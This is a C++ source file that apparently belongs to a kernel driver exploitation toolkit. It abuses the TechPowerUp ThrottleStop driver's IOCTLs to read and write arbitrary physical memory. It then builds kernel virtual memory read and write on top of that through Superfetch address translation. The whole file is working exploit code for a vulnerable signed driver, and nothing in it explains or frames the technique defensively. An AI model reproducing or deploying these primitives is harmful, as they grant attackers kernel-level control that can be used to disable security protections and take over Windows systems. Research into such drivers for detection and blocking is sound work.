/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025 - 2026
*
*  TITLE:       TPUP.CPP
*
*  VERSION:     1.47
*
*  DATE:        25 Mar 2026
*
*  TechPowerUp ThrottleStop driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/tpup.h"

/*
* TpupReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory via ThrottleStop driver.
*
*/
BOOL TpupReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite)
{
    NTSTATUS ntStatus;
    ULONG chunkSize;
    ULONG ioctl;
    ULONG_PTR offset = 0;
    UCHAR inputBuffer[16];
    UCHAR outputBuffer[8];
    IO_STATUS_BLOCK ioStatus;

    if (NumberOfBytes == 0 || Buffer == NULL)
        return FALSE;

    ioctl = DoWrite ? IOCTL_TPUP_WRITE_PHYSICAL_MEMORY : IOCTL_TPUP_READ_PHYSICAL_MEMORY;

    while (offset < NumberOfBytes) {

        chunkSize = NumberOfBytes - (ULONG)offset;
        if (chunkSize > TPUP_MAX_CHUNK_SIZE)
            chunkSize = TPUP_MAX_CHUNK_SIZE;

        RtlSecureZeroMemory(inputBuffer, sizeof(inputBuffer));
        RtlSecureZeroMemory(outputBuffer, sizeof(outputBuffer));

        *(PULONG64)inputBuffer = PhysicalAddress + offset;

        if (DoWrite) {

            RtlCopyMemory(&inputBuffer[8], RtlOffsetToPointer(Buffer, offset), chunkSize);

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                inputBuffer,
                8 + chunkSize,
                NULL,
                0,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;
        }
        else {

            ntStatus = supCallDriverEx(DeviceHandle,
                ioctl,
                inputBuffer,
                sizeof(ULONG64),
                outputBuffer,
                chunkSize,
                &ioStatus);

            if (!NT_SUCCESS(ntStatus))
                return FALSE;

            if (ioStatus.Information != chunkSize)
                return FALSE;

            RtlCopyMemory(RtlOffsetToPointer(Buffer, offset), outputBuffer, chunkSize);
        }

        offset += chunkSize;
    }

    return TRUE;
}

/*
* TpupReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* TpupWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory via ThrottleStop driver.
*
*/
BOOL WINAPI TpupWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return TpupReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* TpupReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        TpupReadPhysicalMemory);
}

/*
* TpupWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via ThrottleStop using Superfetch translation.
*
*/
BOOL WINAPI TpupWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        TpupWritePhysicalMemory);
}
